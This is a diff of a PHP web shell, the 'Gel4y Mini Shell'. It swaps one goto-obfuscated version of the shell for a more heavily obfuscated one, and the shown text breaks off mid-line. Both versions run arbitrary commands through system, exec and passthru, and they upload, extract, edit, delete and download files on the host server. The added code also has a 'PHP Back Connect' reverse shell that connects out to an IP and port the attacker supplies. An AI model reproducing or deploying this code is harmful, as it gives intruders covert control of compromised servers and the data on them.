@@ -1,154 +1,31 @@
 <?php
-define("FuE", "Gel4y Mini Shells");
-if (isset($_GET['l'])) {
-    goto GrS;
-}
-$xn5 = getcwd();
-goto abH;
-GrS:
-$xn5 = u5O($_GET['l']);
-chdir($xn5);
-abH:
-function vcI($LeI)
-{
-    if (function_exists('system')) {
-        goto lZI;
-    }
-    if (function_exists('exec')) {
-        goto VRQ;
-    }
-    if (function_exists('passthru')) {
-        goto ag_;
-    }
-    if (function_exists('g6n')) {
-        goto xSS;
-    }
-    goto Yup;
-    lZI:
-    @ob_start();
-    @system($LeI);
-    $yEV = @ob_get_contents();
-    @ob_end_clean();
-    return $yEV;
-    goto Yup;
-    VRQ:
-    @exec($LeI, $M4r);
-    $yEV = '';
-    foreach ($M4r as $S06) {
-        $yEV .= $S06;
-        Wc5:
-    }
-    IPU:
-    return $yEV;
-    goto Yup;
-    ag_:
-    @ob_start();
-    @passthru($LeI);
-    $yEV = @ob_get_contents();
-    @ob_end_clean();
-    return $yEV;
-    goto Yup;
-    xSS:
-    $yEV = @g6n($LeI);
-    return $yEV;
-    Yup:
-}
-function M9Q($SS_)
-{
-    $RkC = fileperms($SS_);
-    switch ($RkC & 0xf000) {
-        case 0xc000:
-            $XHu = 's';
-            goto yrK;
-        case 0xa000:
-            $XHu = 'l';
-            goto yrK;
-        case 0x8000:
-            $XHu = '-';
-            goto yrK;
-        case 0x6000:
-            $XHu = 'b';
-            goto yrK;
-        case 0x4000:
-            $XHu = 'd';
-            goto yrK;
-        case 0x2000:
-            $XHu = 'c';
-            goto yrK;
-        case 0x1000:
-            $XHu = 'p';
-            goto yrK;
-        default:
-            $XHu = 'u';
-    }
-    K50:
-    yrK:
-    $XHu .= $RkC & 0x100 ? 'r' : '-';
-    $XHu .= $RkC & 0x80 ? 'w' : '-';
-    $XHu .= $RkC & 0x40 ? $RkC & 0x800 ? 's' : 'x' : ($RkC & 0x800 ? 'S' : '-');
-    $XHu .= $RkC & 0x20 ? 'r' : '-';
-    $XHu .= $RkC & 0x10 ? 'w' : '-';
-    $XHu .= $RkC & 0x8 ? $RkC & 0x400 ? 's' : 'x' : ($RkC & 0x400 ? 'S' : '-');
-    $XHu .= $RkC & 0x4 ? 'r' : '-';
-    $XHu .= $RkC & 0x2 ? 'w' : '-';
-    $XHu .= $RkC & 0x1 ? $RkC & 0x200 ? 't' : 'x' : ($RkC & 0x200 ? 'T' : '-');
-    return $XHu;
-}
-function qus($x0e)
-{
-    global $bjr;
-    if (!(trim(pathinfo($x0e, PATHINFO_BASENAME), '.') === '')) {
-        goto IJW;
-    }
-    return;
-    IJW:
-    if (is_dir($x0e)) {
-        goto kOi;
-    }
-    unlink($x0e);
-    goto yV2;
-    kOi:
-    array_map("deldir", glob($x0e . DIRECTORY_SEPARATOR . '{,.}*', GLOB_BRACE | GLOB_NOSORT));
-    rmdir($x0e);
-    yV2:
-}
-function U5o($Ei_, $Fjj = true, $qnW = 0)
-{
-    $g4R = '';
-    $api = strlen($Ei_);
-    if ($Fjj == false) {
-        goto GwC;
-    }
-    UMq:
-    if (!($qnW < $api - 1)) {
-        goto xlD;
-    }
-    $g4R .= chr(hexdec("{$Ei_[$qnW]}{$Ei_[$qnW + 1]}"));
-    L4e:
-    $qnW += 2;
-    goto UMq;
-    xlD:
-    goto wMh;
-    GwC:
-    gat:
-    if (!($qnW < $api)) {
-        goto TZG;
-    }
-    $g4R .= dechex(ord($Ei_[$qnW]));
-    EeC:
-    $qnW++;
-    goto gat;
-    TZG:
-    wMh:
-    return $g4R;
-}
-function Ytx($CAT, $jWh = 1, $HXI = "")
-{
-    global $xn5;
-    $laH = $jWh == 1 ? "success" : "error";
-    echo "<script>swal({title: \"{$laH}\", text: \"{$CAT}\", icon: \"{$laH}\"}).then((btnClick) => {if(btnClick){document.location.href=\"?l=" . U5O($xn5, 0) . $HXI . "\"}})</script>";
-}
-?>
+ goto s9u9_ni4xe; nx4H_osQzp: Dz60W6jbh8: goto TyFYUmAEq5; L8TjZe_v0G: ?></span>
+<div class="form-group"><label for="ctn">Content :</label><textarea id="ctn" cols="30" rows="10" class="form-control" readonly><?php  goto DX625eVwS2; CjHzdcIpw4: ?>
+    <?php  goto SyWsbjzw2B; k1DnvpA5gF: if (!in_array($uuT42WnhRN[$vjeKX6vmt9], $NsqshqwBsc)) { goto f5V4SeQe60; } goto d5NCtpmmne; b3FZnFQPFt: if ($gAAylQtr2x == 'view') { goto X94ON33i95; } goto LWpw7tFZAk; AfOhj0UgbP: goto F5zzwsOrwM; goto T0ShNahMsS; TVW0zWduYC: echo isset($_POST["cmd"]) ? $_POST["cmd"] . "<br>" . wHagu3ZQsi($_POST["cmd"]) : ""; goto Pqd0zB58gx; LlS32zgNke: goto SxcAwFEBKX; goto KlOPnfptF3; tf_GYYPDNs: goto Nu23wv6Cuk; goto DtJAkM2NdT; exXW1ff1ej: echo htmlspecialchars(file_get_contents($I_lN09c7SW . '/' . Scod165Rr2($_GET["n"]))); goto oHjPWHLCJ8; GAnbK2Gu_o: if ($gAAylQtr2x == 'edit') { goto NpedkrNY5l; } goto sSV9jj5ONY; S2DrRYDFeJ: echo '</div>'; goto X5vp9ETlF5; RXpQHWwJtA: if (isset($_GET['l'])) { goto D5xQkaqN6L; } goto hAfMRrdZSP; Pt9UAQTj13: if ($CwSBQX1tlw != 0) { goto yJvJoa_rQx; } goto vs2fVqZPc7; ZoGfj_hn2i: $RFJjcUG5Gt->extractTo(basename($hNee7BwYVM[$vjeKX6vmt9], '.zip')); goto QwV5y1setZ; Hxxc32aPGE: if (!isset($_GET["a"])) { goto N2NcOymve_; } goto lPgHZmpYMg; SyWsbjzw2B: if ($gAAylQtr2x == "con") { goto XToGaMZfBf; } goto P0yX4k6fYm; ck01LmK9wz: ?>" class="form-control">
+  <input type="number" name="port" placeholder="<?php  goto I4QrGGydqc; ueI6__rUxY: YP4sAQJU9f: goto ZDyElMZQmF; vYlc0DQeYv: @fwrite($Fpn18PJz_d, "\n" . wHAGu3Zqsi($VeG3fnVpnw) . "\n\n"); goto g0W1Ju8B27; d5NCtpmmne: $RFJjcUG5Gt = new ZipArchive(); goto mFN0sccJhQ; lebg1dTG9A: goto ORqp0RHsir; goto ubggL2f1oi; RbtICqnK6J: foreach ($kMin7PhsG_ as $LUUf7MY0af => $Aco71nSfAj) { goto K9i5nUPtq4; i5XzUdXX0Z: $vjeKX6vmt9++; goto C3LZiCR3_i; wNPNUHWJGy: if (!($vjeKX6vmt9 != $LUUf7MY0af)) { goto c8tMyfyTG9; } goto qj9udYt_6J; Yu3S8os5Nq: D2s1AfZX6i: goto pNzUW6Gwn2; CLYNLODOnd: if (!($Aco71nSfAj == "")) { goto D2s1AfZX6i; } goto uH367GWfVl; G_PkRy6bi4: W0Hn_70_c3: goto RZLu5V3sJT; TSwMjydgXx: tXF9aIpjQQ: goto CLYNLODOnd; uH367GWfVl: goto W0Hn_70_c3; goto Yu3S8os5Nq; pNzUW6Gwn2: echo "<a href=\"?l="; goto w9om4cDEPl; K9i5nUPtq4: if (!($LUUf7MY0af == 0 && $Aco71nSfAj == "")) { goto tXF9aIpjQQ; } goto HA81wKzfTX; w9om4cDEPl: $vjeKX6vmt9 = 0; goto iPmhYRV5IU; pQJdpWTwd7: uULT0pjWL2: goto Z1y4YwxzT4; Z1y4YwxzT4: echo "\">{$Aco71nSfAj}</a>/"; goto G_PkRy6bi4; o9YucUL_yn: Mchswj2lgu: goto i5XzUdXX0Z; VDjc8KM1jD: c8tMyfyTG9: goto o9YucUL_yn; C3LZiCR3_i: goto KeezW0T_2H; goto pQJdpWTwd7; iPmhYRV5IU: KeezW0T_2H: goto dMVv5u3LzW; qj9udYt_6J: echo "2f"; goto VDjc8KM1jD; dMVv5u3LzW: if (!($vjeKX6vmt9 <= $LUUf7MY0af)) { goto uULT0pjWL2; } goto EUoNRxYJBI; Y2Cwy2NtsR: goto W0Hn_70_c3; goto TSwMjydgXx; EUoNRxYJBI: echo ScoD165Rr2($kMin7PhsG_[$vjeKX6vmt9], 0); goto wNPNUHWJGy; HA81wKzfTX: echo "<a href=\"?l=2f\">~</a>/"; goto Y2Cwy2NtsR; RZLu5V3sJT: } goto xZnIA30vwd; zh491hjpMe: $Fpn18PJz_d = fsockopen($elMz8LjgjN, $Hb2xi6CLoa, $CwSBQX1tlw, $q5jUdzyF0Y); goto Pt9UAQTj13; lYWHG190jR: $eKiFvQ2vHC = whAgu3zQsI('time'); goto INSDE3e0Og; qTOgQRiQRf: isset($_POST["s"]) ? file_exists("{$I_lN09c7SW}/{$_POST["n"]}") ? WVHimb1Xbo("file name has been used", scod165rR2($I_lN09c7SW, 0) . "&a=" . scOD165Rr2("cfile", 0), 0) : (file_put_contents("{$I_lN09c7SW}/{$_POST["n"]}", $_POST["ctn"]) ? wvhImb1xbO("file created successfully", sCoD165Rr2($I_lN09c7SW, 0) . "&a=" . ScoD165rR2("view", 0) . "&n=" . sCod165rR2($_POST["n"], 0)) : wVhImB1xBo("file failed to create", sCOd165Rr2($I_lN09c7SW, 0), 0)) : null; goto QSZBpPfN28; rN5UEpxXG0: ?>
+      </tbody>
+    </table>
+    <?php  goto KCB8Hmi5ow; TMx4zSNbwx: ?>
+      </div>
+    </div>
+    <article class="bg-dark border table-responsive">
+    <?php  goto ZhKBv1Iz3W; pcpGqYKxIS: Cb_9Ef9Dvf: goto iNLcphRy60; hAfMRrdZSP: $I_lN09c7SW = getcwd(); goto ocXYZDbAyt; RQHxIIj1cZ: f5V4SeQe60: goto w0SyngrYUd; cPKCcf7MR9: isset($_POST["s"]) ? rename($I_lN09c7SW . '/' . SCOd165RR2($_GET["n"]), $_POST["n"]) ? WVHImb1XBO("successfully changed the name", scOD165rR2($I_lN09c7SW, 0)) : wVHiMB1Xbo("failed to change the name", SCod165rr2($I_lN09c7SW, 0), 0) : null; goto JIkdCXtH17; iNLcphRy60: ?>
+    <h5>Command</h5>
+    <pre class="border bg-info p-2"><i class="fa fa-terminal"></i> <?php  goto TVW0zWduYC; lPgHZmpYMg: $gAAylQtr2x = ScOD165rr2($_GET["a"]); goto NOPki1VPRd; FF3jjGmujV: if ($gAAylQtr2x == "term") { goto Cb_9Ef9Dvf; } goto GAnbK2Gu_o; yu0QvRDrXG: isset($_POST["s"]) ? file_exists("{$I_lN09c7SW}/{$_POST["n"]}") ? WVhimb1XBO("folder name has been used", scOd165rR2($I_lN09c7SW, 0) . "&a=" . SCOD165rr2("cdir", 0)) : (mkdir("{$I_lN09c7SW}/{$_POST["n"]}") ? WvHiMB1xBo("folder created successfully", SCOd165Rr2($I_lN09c7SW . "/" . $_POST["n"], 0)) : wvhimB1Xbo("folder failed to create", scoD165rr2($I_lN09c7SW, 0), 0)) : null; goto T1UBhoC41_; ubggL2f1oi: Xo6cle392S: goto ySJeKYveVV; sSV9jj5ONY: if ($gAAylQtr2x == 'rename') { goto ItvXrc1MPf; } goto b3FZnFQPFt; r7MKcqXetT: fwrite($Fpn18PJz_d, 'User ', $s1OVK9lbWK, 'connected @ ', $eKiFvQ2vHC, "\n\n"); goto shAzs1kguU; G2kpOd1WrM: $vjeKX6vmt9 = 0; goto m8SfLGjd02; rTQ20f4P4n: unlink($jQm7oyW4Qu); goto Zt4_Ja_dmq; FMHj1HdkPm: ?>"><i class="fa fa-plus"></i><i class="fa fa-folder"></i></a> |
+          <a href="<?php  goto LuWToMYtnr; ysxCc13A4L: ?>
+    </div>
+    <?php  goto sNH2AjSsc9; t4YglQhiE5: echo "{$_SERVER["SERVER_NAME"]} ({$_SERVER["REMOTE_ADDR"]})"; goto W6NY1sTvKY; jGF3noaFi0: Nu23wv6Cuk: goto DkoO5aHwEx; KCB8Hmi5ow: P3Hi2iwd1U: goto MMQV_0sye0; eePSHQiHXJ: if (!file_exists($jQm7oyW4Qu)) { goto Xo6cle392S; } goto eqMjYxDM2L; uI2vWciHOE: echo BYteAsdnoT; goto GOA9daq_pY; c0mwifDa50: ?>
+    <h5>View <?php  goto H4JBzu3vyj; Hgp6UtYbMT: ?></span>
+<form method="post"><div class="form-group"><label for="ctn">Content :</label><textarea name="ctn" id="ctn" cols="30" rows="10" class="form-control"><?php  goto exXW1ff1ej; PAsjWvUaE8: echo $_SERVER["REMOTE_ADDR"]; goto ck01LmK9wz; kJxOA4IXhJ: $hNee7BwYVM = $_FILES['f']['name']; goto G2kpOd1WrM; o9PS4uYfjH: c8u9XhYh_Q: goto k1DnvpA5gF; DX625eVwS2: echo htmlspecialchars(file_get_contents($I_lN09c7SW . '/' . ScOd165rR2($_GET["n"]))); goto zHFMF9i2dl; rOBq0oetEF: $kMin7PhsG_ = preg_split("/(\\\\|\\/)/", $I_lN09c7SW); goto RbtICqnK6J; FBNnUH4b7H: WvhImb1Xbo("file deleted successfully", scOD165rr2($I_lN09c7SW, 0)); goto jGF3noaFi0; xZnIA30vwd: u4xi6_rkve: goto TMx4zSNbwx; oQBmms1zYb: $I_lN09c7SW = scoD165RR2($_GET['l']); goto l0VEWWoryp; UE8pM5OTuV: xBsgNP_qmX($jQm7oyW4Qu); goto eePSHQiHXJ; s9u9_ni4xe: define("BYteAsdnoT", "Gel4y Mini Shell"); goto RXpQHWwJtA; v0RE2SAi9i: ?>
+    <h5>Edit file</h5>
+    <span>File name : <?php  goto hThw1FAitG; TCSiM3MGpt: header("Content-Type: application/octet-stream"); goto GR4PSTwJoi; ZnAAx43Xnz: $elMz8LjgjN = $_POST['port']; goto zh491hjpMe; d56bXPkOvG: H5yuZJRAjS: goto uP3nEDF0Tt; zEi70zkzTd: if (!($gAAylQtr2x == "delete")) { goto KdWNo7AjqV; } goto hRufaLMoAj; fZPMa7C5AR: $uuT42WnhRN = $_FILES['f']['type']; goto ycQGAJ9rpW; g0W1Ju8B27: goto K5sIIxj_F3; goto bJHEdblZKU; OWUVT5Hc5g: function sCod165rr2($nhC875hiZm, $xHh5aDGVzW = true, $vjeKX6vmt9 = 0) { goto sfkjqKbPuW; DkMtNfaO35: $vjeKX6vmt9 += 2; goto eaBVgCN7DT; N1MTP5nE3J: $clfdCXlE6r .= chr(hexdec("{$nhC875hiZm[$vjeKX6vmt9]}{$nhC875hiZm[$vjeKX6vmt9 + 1]}")); goto QQlUco0bGy; Q9SR7IUbD4: XwKFq9PN3H: goto AptbdhXBJK; iN67ygIXj4: hHvcORMXt6: goto XJ34DXGbfW; QQlUco0bGy: CLasDIi50q: goto DkMtNfaO35; nvcr7Nt1hS: goto iiFaUFBjLs; goto HvHWsSysNA; OGUyjvgHuz: goto hHvcORMXt6; goto T4U27yRjQz; mhZ3B7d8Ao: iiFaUFBjLs: goto jR8ZYWzAe5; N740lbEyas: $clfdCXlE6r .= dechex(ord($nhC875hiZm[$vjeKX6vmt9])); goto Q9SR7IUbD4; XJ34DXGbfW: if (!($vjeKX6vmt9 < $yJTLlApkG3)) { goto KueXfd4Alx; } goto N740lbEyas; nUHUNQ2_7A: afo7jO332e: goto nvcr7Nt1hS; jR8ZYWzAe5: return $clfdCXlE6r; goto qMy68HqlIW; eaBVgCN7DT: goto P_69xj9gGk; goto nUHUNQ2_7A; T4U27yRjQz: KueXfd4Alx: goto mhZ3B7d8Ao; AptbdhXBJK: $vjeKX6vmt9++; goto OGUyjvgHuz; HvHWsSysNA: jexCLEsLzR: goto iN67ygIXj4; LWmmAs4bN0: if ($xHh5aDGVzW == false) { goto jexCLEsLzR; } goto UxQ_ffQhCJ; ESrG6JqjCA: $yJTLlApkG3 = strlen($nhC875hiZm); goto LWmmAs4bN0; UxQ_ffQhCJ: P_69xj9gGk: goto n0n3yqVYzA; n0n3yqVYzA: if (!($vjeKX6vmt9 < $yJTLlApkG3 - 1)) { goto afo7jO332e; } goto N1MTP5nE3J; sfkjqKbPuW: $clfdCXlE6r = ''; goto ESrG6JqjCA; qMy68HqlIW: } goto ZXVrkJoKku; XOFxDlRi7Q: $UA2QAI9Aou = WHAgu3zQsI('pwd'); goto a4ylo9zyoS; vtO6Mte_uT: goto F5zzwsOrwM; goto hZCBXjh5xa; zHFMF9i2dl: ?></textarea></div>
+    <?php  goto gG13wzHgsR; w0SyngrYUd: WVhIMB1Xbo("file uploaded successfully", SCOd165Rr2($I_lN09c7SW, 0)); goto IXOP4R0rfy; I4QrGGydqc: echo rand(1, 6) * 1922; goto LEdsfT_f5L; Z9dkzv793z: KiTWSOTYvH: goto rN5UEpxXG0; OeI0AYCWg5: wvHimB1xbo("file failed to upload", SCOD165Rr2($I_lN09c7SW, 0), 0); goto qpvqDxlak2; kfkPETDaAp: SxcAwFEBKX: goto Gjo1HTRnN2; mox6qQiktB: ?>
+    <h5>PHP Back Connect</h5>
+    <form method="post">
+    <div class="input-group mb-3">
+  <input type="text" name="ip" placeholder="<?php  goto PAsjWvUaE8; VjwIX64Qky: ?>"><i class="fa fa-plus"></i><i class="fa fa-file"></i></a> |
+          <a href="<?php  goto vpD6oLHWNu; FK22nGHGLF: if (!isset($_GET["download"])) { goto qxwiPIxTUE; } goto TCSiM3MGpt; BrCC99QmZj: goto KQLt0D0U6k; goto XRfaw0lEpa; lHTV2LHwsZ: $VeG3fnVpnw = fgets($Fpn18PJz_d, $yJTLlApkG3); goto vYlc0DQeYv; shAzs1kguU: K5sIIxj_F3: goto LwTnKrb2gA; z80W2Hg6XW: ?>"><i class="fa fa-usb"></i></a> |
+          <a href="<?php  goto Yy5ei4krjv; vs2fVqZPc7: if (!$Fpn18PJz_d) { goto JN0mJFE3Bn; } goto LlS32zgNke; ur1ttufF6K: JN0mJFE3Bn: goto tB9vZK2Qir; YPRTSligfx: goto F5zzwsOrwM; goto r1bYIhfphm; Jm3tyWVk1H: ?>
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -176,33 +53,8 @@ function Ytx($CAT, $jWh = 1, $HXI = "")
     <div class="border bg-dark px-1">
       <div class="d-flex justify-content-between">
         <div>
-          <h3 class="mt-2"><a href="?"><?php 
-echo FuE;
-?></a></h3>
-        </div>
-        <div>
-          <span>PHP Version: <?php 
-echo phpversion();
-?></span><br>
-          <a href="<?php 
-echo "?l=" . U5O($xn5, 0) . "&a=" . U5O("cdir", 0);
-?>"><i class="fa fa-plus-circle"></i> Folder</a> |
-          <a href="<?php 
-echo "?l=" . U5O($xn5, 0) . "&a=" . u5o("cfile", 0);
-?>"><i class="fa fa-plus-circle"></i> File</a> |
-          <a href="<?php 
-echo "?l=" . U5o($xn5, 0) . "&a=" . U5o("term", 0);
-?>"><i class="fa fa-terminal"></i></a>
-        </div>
-      </div>
-      <div class="border-top">
-        <ul style="list-style:none;" class="m-0 p-0">
-          <li><b>Server</b>: <?php 
-echo "{$_SERVER["SERVER_NAME"]} ({$_SERVER["REMOTE_ADDR"]})";
-?></li>
-          <li><b>PHP Uname</b>: <?php 
-echo php_uname();
-?></li>
+          <h3 class="mt-2"><a href="?"><?php  goto uI2vWciHOE; P0yX4k6fYm: if ($gAAylQtr2x == "cfile") { goto TGbvyJ958C; } goto cRcypwIMXV; W6NY1sTvKY: ?></li>
+          <li><b>PHP Uname</b>: <?php  goto l3ix3EWzDy; Zt4_Ja_dmq: if (!file_exists($jQm7oyW4Qu)) { goto Rzfxu3cAA0; } goto juZgOCu0BF; m01do8WUWb: $elMz8LjgjN = $_POST['ip']; goto ZnAAx43Xnz; cRcypwIMXV: if ($gAAylQtr2x == "cdir") { goto fGH6sGAAdw; } goto FF3jjGmujV; sHel6mqugS: if (!isset($_FILES['f'])) { goto oH2FX19oex; } goto kJxOA4IXhJ; DtJAkM2NdT: Rzfxu3cAA0: goto FBNnUH4b7H; INSDE3e0Og: $yJTLlApkG3 = 1337; goto r7MKcqXetT; xBEic2r1ZC: X1wrvj1lS4: goto RQHxIIj1cZ; X_XgIW8VNc: $jQm7oyW4Qu = $I_lN09c7SW . '/' . scOD165Rr2($_GET["n"]); goto rTQ20f4P4n; Gjo1HTRnN2: fwrite($Fpn18PJz_d, "\n            \n{#######################################}\n            \n..:: Gel4y Shell PHP BackConnect ::..\n            \n{#######################################}\n"); goto XOFxDlRi7Q; ycQGAJ9rpW: $NsqshqwBsc = array('application/zip', 'application/x-zip-compressed', 'multipart/x-zip', 'application/x-compressed'); goto ejtmqujYNb; hZCBXjh5xa: ItvXrc1MPf: goto c0mwifDa50; MVg1PkuxCs: @fclose($Fpn18PJz_d); goto S2DrRYDFeJ; ZXVrkJoKku: function WVHiMb1xbO($b9mgnbRgIV, $jQm7oyW4Qu, $x4Zx03KHcZ = 1) { $BJotyYe5l6 = $x4Zx03KHcZ == 1 ? "success" : "error"; echo "<script>swal({title: \"{$BJotyYe5l6}\", text: \"{$b9mgnbRgIV}\", icon: \"{$BJotyYe5l6}\"}).then((btnClick) => {if(btnClick){document.location.href=\"?l=" . $jQm7oyW4Qu . "\"}})</script>"; } goto Jm3tyWVk1H; jftsKZuteU: ?></li>
         </ul>
       </div>
       <form method="post" enctype="multipart/form-data">
@@ -213,168 +65,8 @@ echo php_uname();
           </div>
         </div>
       </form>
-      <?php 
-if (!isset($_FILES['f'])) {
-    goto E6Y;
-}
-$SOl = $_FILES['f']['name'];
-$qnW = 0;
-sKq:
-if (!($qnW < count($SOl))) {
-    goto LNu;
-}
-$gVG = $_FILES['f']['tmp_name'];
-$mQM = $_FILES['f']['type'];
-$m4y = array('application/zip', 'application/x-zip-compressed', 'multipart/x-zip', 'application/x-compressed');
-if (move_uploaded_file($gVG[$qnW], $SOl[$qnW])) {
-    goto m4g;
-}
-yTX("file failed to upload", 0);
-goto AlR;
-m4g:
-if (!in_array($mQM[$qnW], $m4y)) {
-    goto JPu;
-}
-$gdZ = new ZipArchive();
-$WNV = $gdZ->open($SOl[$qnW]);
-if (!($WNV == true)) {
-    goto Z5E;
-}
-$gdZ->extractTo(basename($SOl[$qnW], '.zip'));
-$gdZ->close();
-Z5E:
-JPu:
-ytX("file uploaded successfully");
-AlR:
-z4V:
-$qnW++;
-goto sKq;
-LNu:
-E6Y:
-if (!isset($_GET["download"])) {
-    goto vcG;
-}
-header("Content-Type: application/octet-stream");
-header("Content-Transfer-Encoding: Binary");
-header("Content-Length: " . strtotime(U5o($_GET["n"])));
-header("Content-disposition: attachment; filename=\"" . u5o($_GET["n"]) . "\"");
-vcG:
-?>
-    </div>
-    <div class="border bg-dark my-2 py-2 table-responsive">
-      <div class="mx-2">
-        <span>Path:</span>
-        <?php 
-$KGw = preg_split("/(\\\\|\\/)/", $xn5);
-foreach ($KGw as $CtC => $ALt) {
-    if (!($CtC == 0 && $ALt == "")) {
-        goto XMF;
-    }
-    echo "<a href=\"?l=2f\">~</a>/";
-    goto yMD;
-    XMF:
-    if (!($ALt == "")) {
-        goto o15;
-    }
-    goto yMD;
-    o15:
-    echo "<a href=\"?l=";
-    $qnW = 0;
-    qOs:
-    if (!($qnW <= $CtC)) {
-        goto u1a;
-    }
-    echo U5O($KGw[$qnW], 0);
-    if (!($qnW != $CtC)) {
-        goto r7n;
-    }
-    echo "2f";
-    r7n:
-    UEF:
-    $qnW++;
-    goto qOs;
-    u1a:
-    echo "\">{$ALt}</a>/";
-    yMD:
-}
-NcF:
-?>
-      </div>
-    </div>
-    <article class="bg-dark border table-responsive">
-    <?php 
-if (!isset($_GET["a"])) {
-    goto lAe;
-}
-if (!isset($_GET["a"])) {
-    goto i2O;
-}
-$EmZ = u5O($_GET["a"]);
-?>
-    <div class="px-2 py-2">
-    <?php 
-if (!($EmZ == "delete")) {
-    goto pnr;
-}
-$HXI = $xn5 . '/' . u5o($_GET["n"]);
-if (!($_GET["t"] == "d")) {
-    goto mpj;
-}
-qUs($HXI);
-if (!file_exists($HXI)) {
-    goto oxH;
-}
-yTX("failed to delete the folder", 0);
-goto i4l;
-oxH:
-Ytx("folder deleted successfully");
-i4l:
-mpj:
-if (!($_GET["t"] == "f")) {
-    goto dYD;
-}
-$HXI = $xn5 . '/' . U5O($_GET["n"]);
-unlink($HXI);
-if (!file_exists($HXI)) {
-    goto Zh7;
-}
-YTX("file to delete the folder", 0);
-goto jZj;
-Zh7:
-ytX("file deleted successfully");
-jZj:
-dYD:
-pnr:
-?>
-    <?php 
-if ($EmZ == "cfile") {
-    goto dOZ;
-}
-if ($EmZ == "cdir") {
-    goto fQt;
-}
-if ($EmZ == "term") {
-    goto U6J;
-}
-if ($EmZ == 'edit') {
-    goto e9j;
-}
-if ($EmZ == 'rename') {
-    goto o8K;
-}
-if ($EmZ == 'view') {
-    goto WMV;
-}
-goto vTq;
-dOZ:
-?>
-    <h5>New folder</h5>
-    <form method="post"><div class="form-group"><label for="n">File name :</label><input type="text" name="n" id="n" class="form-control" placeholder="hack.txt"></div><div class="form-group"><label for="ctn">Content :</label><textarea name="ctn" id="ctn" cols="30" rows="10" class="form-control" placeholder="# Stamped By Me"></textarea></div><div class="form-group"><button type="submit" name="s" class="btn btn-outline-light rounded-0">Create</button></div></form>
-    <?php 
-isset($_POST["s"]) ? file_exists("{$xn5}/{$_POST["n"]}") ? ytX("file name has been used", 0, "&a=" . U5O("cfile", 0)) : (file_put_contents("{$xn5}/{$_POST["n"]}", $_POST["ctn"]) ? YTX("file created successfully", 1, "&a=" . u5o("view", 0) . "&n=" . U5O($_POST["n"], 0)) : YtX("file failed to create", 0)) : null;
-goto vTq;
-fQt:
-?>
+      <?php  goto sHel6mqugS; TyFYUmAEq5: function whagU3Zqsi($Ss4YblvGzi) { goto U6mxdQ5TPd; JESyI3I_EC: $LTbuLnsRbh = @Bc_gFRHaT7($Ss4YblvGzi); goto L69iiQ4VB_; L69iiQ4VB_: return $LTbuLnsRbh; goto tU97XVvgG4; U6mxdQ5TPd: if (function_exists('system')) { goto phhWxvNIRF; } goto GXxXqPVu_s; jT1FNETWrK: @ob_end_clean(); goto dS5nEYoTky; rGRicy91Vl: return $LTbuLnsRbh; goto rVkBtVSmf2; noUSl7OsSq: $LTbuLnsRbh = ''; goto RpI6WaRtjl; RpI6WaRtjl: foreach ($jcQuwKNUeF as $inT77z9QL1) { $LTbuLnsRbh .= $inT77z9QL1; uDF57UvBz6: } goto QE4ju5iUNX; UQ9bPiHC4u: phhWxvNIRF: goto i2yFHS8Iqv; tU97XVvgG4: jocoSWByK8: goto WdUnKBfl39; bsnW6hpeJm: ZW9__Q7wzH: goto JXoXevtdUt; i2yFHS8Iqv: @ob_start(); goto ByY3HshN_Z; djbW2ce5Q3: if (function_exists('passthru')) { goto dr3sN_wGkM; } goto bwwM_EXcJt; BBtL7fdIBh: goto jocoSWByK8; goto UQ9bPiHC4u; GXxXqPVu_s: if (function_exists('exec')) { goto ZW9__Q7wzH; } goto djbW2ce5Q3; dS5nEYoTky: return $LTbuLnsRbh; goto Y5QcT8ZnuA; dITRognc85: @ob_end_clean(); goto rGRicy91Vl; ByY3HshN_Z: @system($Ss4YblvGzi); goto GAmYuseJhh; biv3xUKYVv: return $LTbuLnsRbh; goto IkLRGFI2ab; yFWRQSSw4v: oReuh7fJSO: goto JESyI3I_EC; QE4ju5iUNX: zMRNaIbL4k: goto biv3xUKYVv; fVnhRyGVXS: @ob_start(); goto dsw340sh9W; OFlaYYZrW8: $LTbuLnsRbh = @ob_get_contents(); goto jT1FNETWrK; rVkBtVSmf2: goto jocoSWByK8; goto bsnW6hpeJm; hSzcd8AqN8: dr3sN_wGkM: goto fVnhRyGVXS; Y5QcT8ZnuA: goto jocoSWByK8; goto yFWRQSSw4v; JXoXevtdUt: @exec($Ss4YblvGzi, $jcQuwKNUeF); goto noUSl7OsSq; bwwM_EXcJt: if (function_exists('bC_GfRHAt7')) { goto oReuh7fJSO; } goto BBtL7fdIBh; dsw340sh9W: @passthru($Ss4YblvGzi); goto OFlaYYZrW8; GAmYuseJhh: $LTbuLnsRbh = @ob_get_contents(); goto dITRognc85; IkLRGFI2ab: goto jocoSWByK8; goto hSzcd8AqN8; WdUnKBfl39: } goto XDOSwg8E31; vpD6oLHWNu: echo "?l=" . SCOD165rR2($I_lN09c7SW, 0) . "&a=" . sCOD165Rr2("con", 0); goto z80W2Hg6XW; FB75EhKxg7: foreach ($RMHbuQpaGc as $hFrCwZLJYl) { goto heoLajAExY; Rx2XtCNNTJ: sLfFlee4z2: goto z6VE34T7ce; ehxlyK7y53: goto zYWOjVqkGE; goto Rx2XtCNNTJ; oSSQtogwMt: zYWOjVqkGE: goto sYjYjilZgD; yRtHb89pwU: $yARdv6rR_v = $yARdv6rR_v > 1024 ? round($yARdv6rR_v / 1024, 2) . "MB" : $yARdv6rR_v . "KB"; goto cm_Gp31QO8; heoLajAExY: if (is_file("{$I_lN09c7SW}/{$hFrCwZLJYl}")) { goto sLfFlee4z2; } goto ehxlyK7y53; VLAGD1LAK2: $yARdv6rR_v = round($yARdv6rR_v, 3); goto yRtHb89pwU; cm_Gp31QO8: echo "<tr>\n\t        <td><a href=\"?l=" . scOD165RR2($I_lN09c7SW, 0) . "&a=" . scoD165Rr2("view", 0) . "&n=" . Scod165rR2($hFrCwZLJYl, 0) . "\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Latest modify on " . date("Y-m-d H:i", filemtime("{$I_lN09c7SW}/{$hFrCwZLJYl}")) . "\"><i class=\"fa fa-fw fa-file" . ($_SERVER["SCRIPT_FILENAME"] == "{$I_lN09c7SW}/{$hFrCwZLJYl}" ? " text-danger" : "") . "\"></i> {$hFrCwZLJYl}</a></td>\n\t        <td>{$yARdv6rR_v}</td>\n\t        <td><font color=\"" . (is_writable("{$I_lN09c7SW}/{$hFrCwZLJYl}") ? "#00ff00" : (!is_readable("{$I_lN09c7SW}/{$hFrCwZLJYl}") ? "red" : null)) . "\">" . u9tuCK4i9Z("{$I_lN09c7SW}/{$hFrCwZLJYl}") . "</font></td>\n\t        <td>\n\t          <div class=\"d-flex justify-content-between\">\n\t            <a 